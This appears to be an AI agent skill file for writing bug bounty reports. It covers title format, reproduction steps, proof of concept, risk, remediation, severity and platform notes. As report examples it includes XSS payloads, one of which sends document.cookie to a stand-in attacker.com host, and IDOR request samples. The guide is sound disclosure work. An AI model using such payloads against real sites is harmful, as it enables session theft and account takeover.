---
name: bugbounty-reporter
description: Converts raw bug bounty findings into a complete, triage-ready report — clear description, numbered reproduction steps, self-contained PoC, risk, and remediation. Writes for triagers who are not necessarily security experts. Covers all vuln classes and major platforms (HackerOne, Bugcrowd, Intigriti, YesWeHack).
metadata:
  version: "1.0.0"
  author: AuditGuard
  tags: ["bug-bounty", "reporting", "h1", "bugcrowd", "intigriti", "pentest"]
---

# Bug Bounty Reporter

Turn raw findings into a report that gets triaged, not closed. Bug bounty reports fail for two reasons: the triager can't reproduce it, or can't understand why it matters. This skill fixes both.

---

## Process

1. Parse the finding — vulnerability class, target, what was observed
2. If critical context is missing (endpoint, method, auth state, parameter name), ask **one** question before writing
3. Write the report in the exact structure below
4. Mark any field as `[TO ADD]` if evidence wasn't provided — never invent it

---

## Report Structure

### Title

Format: `{Bug category} in {Scope affected} through {vulnerable parameter or element} Leads To {Impact}`

**Examples:**
```
XSS in target.com/users through query parameter Leads To Account Takeover
IDOR in api.target.com/invoices/{id} through integer ID Leads To Full Customer Data Exposure
SQL Injection in target.com/search through q parameter Leads To Authentication Bypass and Credential Dump
SSRF in target.com/import through url parameter Leads To AWS Metadata Theft
CSRF in target.com/account/delete through form submission Leads To Account Deletion
```

**Bad:**
```
XSS found
Security issue in API
SQL injection vulnerability
```

---

### Description

2–4 sentences. Cover:
- What the vulnerability is
- Where it lives (endpoint, parameter, feature)
- Why it exists (missing validation, no authorization check, etc.)
- What an attacker can do with it

Write for a triager who knows web security basics but hasn't seen your target before. No filler, no "I was testing the application and noticed...". Start with the finding.

**Template:**
```
[Vulnerability class] exists in [location]. The application [root cause — e.g. "does not validate the user_id parameter against the authenticated session"]. An attacker can [what's possible — e.g. "read, modify, or delete any user's invoice by replacing the numeric ID in the request"].
```

**Example:**
```
An IDOR vulnerability exists in the invoice retrieval endpoint GET /api/v1/invoices/{id}. The application returns the full invoice object without verifying that the authenticated user owns the requested invoice. An attacker with any valid account can enumerate and read invoices belonging to all other users by incrementing the integer ID.
```

---

### Steps to Reproduce

Numbered, exact, reproducible by someone who has never seen the app. Every step must be actionable.

Rules:
- Include exact URLs, HTTP methods, parameter names, and values
- State the auth context at step 1 (logged in as what kind of account)
- If two accounts are needed, say so upfront
- Include exact request if possible (Burp/curl format)
- End with what to observe — what proves the vulnerability

**Template:**
```
1. Create two accounts: Account A (victim) and Account B (attacker).
2. Log in as Account A. Navigate to [page]. Note the [object ID] = [value].
3. Log in as Account B.
4. Send the following request:
   [HTTP request or curl command]
5. Observe: [what you see that proves the vulnerability — data returned, action performed, etc.]
```

**Example — IDOR:**
```
1. Create two accounts: Victim (victim@test.com) and Attacker (attacker@test.com).
2. Log in as Victim. Create an invoice. Note the invoice ID in the URL: /invoices/1042.
3. Log in as Attacker.
4. Send:
   GET /api/v1/invoices/1042 HTTP/1.1
   Host: app.example.com
   Authorization: Bearer ATTACKER_TOKEN
5. Observe: the full invoice belonging to Victim is returned, including amount, items, and billing address.
```

**Example — Stored XSS:**
```
1. Log in with any valid account.
2. Navigate to Profile → Edit Bio.
3. Enter the following payload in the bio field and save:
   <img src=x onerror=alert(document.cookie)>
4. Log out. Open the profile page as any other user (or in an incognito tab):
   https://app.example.com/users/VICTIM_USERNAME
5. Observe: the alert fires with the victim's session cookie.
```

---

### Proof of Concept

Concrete evidence. Choose the format that fits the finding:

**HTTP request/response (preferred for API vulns):**
```
Request:
GET /api/v1/invoices/1042 HTTP/1.1
Host: app.example.com
Authorization: Bearer eyJhbGc...  ← Attacker's token

Response:
HTTP/1.1 200 OK
{
  "id": 1042,
  "owner_email": "victim@test.com",
  "amount": 4500.00,
  "items": [...]
}
```

**curl command (for easy reproduction):**
```bash
curl -s -H "Authorization: Bearer ATTACKER_TOKEN" \
  https://app.example.com/api/v1/invoices/1042
```

**Payload (for injection vulns):**
```
Parameter: bio
Payload: <img src=x onerror=fetch('https://attacker.com/steal?c='+document.cookie)>
Triggered on: https://app.example.com/users/victim_username
```

**Screenshot annotation:** describe what the screenshot shows — don't submit a screenshot without a caption.

Rules:
- Redact real user PII in evidence (replace with `VICTIM_EMAIL`, `REDACTED`, etc.)
- Keep attacker tokens short or truncate: `eyJhbGc...[truncated]`
- Never include production credentials in full
- If the action is destructive (delete, overwrite), note that you used test accounts

---

### Risk

State what an attacker can actually do — concrete and direct. No forced structure. Write it as one short paragraph or a few bullet points, whichever fits the finding.

Avoid vague statements like "this could lead to security issues". Name the actual outcome.

**Examples:**

```
An attacker can take over any user account by changing their email address without interaction.
```

```
Exploiting this vulnerability allows reading the billing details, addresses, and purchase history of every customer on the platform.
```

```
An attacker can execute arbitrary JavaScript in the browser of any user who visits the victim's profile — enabling session theft, credential harvesting, or redirecting users to a phishing page.
```

```
A low-privileged attacker can escalate to admin and gain full control of the platform, including access to all user data and the ability to modify application configuration.
```

```
An attacker can drain a victim's account balance by triggering fund transfers without their knowledge or consent.
```

**Quick reference by vuln class:**

| Vuln | Risk |
|---|---|
| IDOR (read) | Read any user's [data] without authorization |
| IDOR (write/delete) | Modify or delete any user's [data] |
| Stored XSS | JS in any visitor's browser → ATO, phishing, credential theft |
| Reflected XSS | JS in victim's browser via crafted link → ATO, session theft |
| SQLi | Credential dump, read/write all data, potential RCE |
| SSRF | Internal service access, cloud credential theft |
| Auth bypass | Access any account or admin panel without a password |
| RCE | Full server compromise |
| CSRF | Any action performed as the victim silently |

---

### Remediation

Specific and actionable. Not "fix the access control" — tell them exactly what to check and where.

**Template:**
```
Verify on every request to [endpoint] that the authenticated user owns the requested [resource] before returning data. The check should happen at the service/controller layer, not just the routing layer.
```

**By vulnerability class:**

| Vuln | Remediation |
|---|---|
| IDOR | Server-side ownership check on every request — compare resource owner ID against session user ID |
| Stored / Reflected XSS | Output-encode all user-supplied data before rendering in HTML. Add `Content-Security-Policy: script-src 'self'`. |
| SQLi | Use parameterized queries / prepared statements. Never concatenate user input into SQL strings. |
| SSRF | Allowlist outbound URLs. Block RFC 1918 and link-local (169.254.x.x). Reject non-HTTP(S) schemes. |
| CSRF | Enforce SameSite=Strict cookies. Validate CSRF token on all state-changing requests. |
| Auth bypass | Enforce session validation and role checks at every protected endpoint, not just the entry route. |
| RCE | Avoid executing user input as system commands. Use safe APIs. Apply least-privilege to the process. |
| JWT weakness | Enforce `alg` explicitly server-side. Use a strong secret or asymmetric keys. Reject `alg: none`. |
| Clickjacking | Add `Content-Security-Policy: frame-ancestors 'none'` and `X-Frame-Options: DENY`. |

---

## Severity Guidance

Don't inflate or deflate — triagers reject both.

| Severity | Typical criteria |
|---|---|
| **Critical** | Unauthenticated RCE, pre-auth SQLi with full DB dump, auth bypass to admin, cloud credential theft via SSRF |
| **High** | Authenticated RCE, stored XSS → ATO, IDOR exposing PII at scale, SSRF to internal network |
| **Medium** | Reflected XSS, IDOR on non-sensitive data, CSRF on sensitive action |
| **Low** | Open redirect, clickjacking on low-value page, missing header without exploitability |
| **Info** | Best practice issue, no direct exploitability |

Include a CVSS vector if the program requires it — use the `cvss-scorer` skill to compute it.

---

## Platform Notes

| Platform | Key notes |
|---|---|
| HackerOne | Markdown supported. Attach screenshots. CVSS optional but appreciated. |
| Bugcrowd | Map your finding to a VRT category in the title or description. |
| Intigriti | Structured fields: description, reproduction, impact, recommendation — keep each focused. |
| YesWeHack | CVSS score field present — fill it. |
| Private programs | Follow their template if provided. When in doubt, use this structure. |

---

## Rules

- Never invent evidence — if it wasn't provided, mark it `[TO ADD]`
- One clarifying question max before writing — don't stall
- No disclaimers or legal boilerplate in the report
- Do not overstate impact to chase a higher bounty — it damages credibility
- If HttpOnly blocks cookie theft in an XSS, state what's actually achievable — not the theoretical max
- Self-XSS with no escalation path = not reportable — flag it and suggest a chain if one exists
